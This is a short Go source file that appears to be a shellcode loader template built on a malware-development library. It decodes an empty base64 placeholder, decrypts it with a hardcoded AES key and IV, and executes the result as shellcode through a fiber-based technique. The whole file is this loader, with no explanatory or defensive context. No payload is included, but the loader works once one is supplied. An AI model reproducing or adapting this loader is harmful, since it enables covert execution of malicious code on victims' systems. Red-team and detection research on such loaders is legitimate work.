package main

import (
	"encoding/base64"
	"fmt"
	"syscall"
	"time"

	"github.com/D3Ext/maldev/src/crypto"
	"github.com/D3Ext/maldev/src/redteam"
)

func main() {

	shell := ""

	iv := []byte("1010101010101010")
	key := []byte("Secware_P@sswdrd!132124356432912")

	sh := []byte{}

	sh, err := base64.StdEncoding.DecodeString(shell)
	if err != nil {
		fmt.Println(err)
	}

	shellcode, err := crypto.AESDecrypt(sh, iv, key)
	if err != nil {
		fmt.Println(err)
	}

	redteam.Fibers(shellcode)

	time.Sleep(20 * time.Second)
	syscall.Exit(0)
}
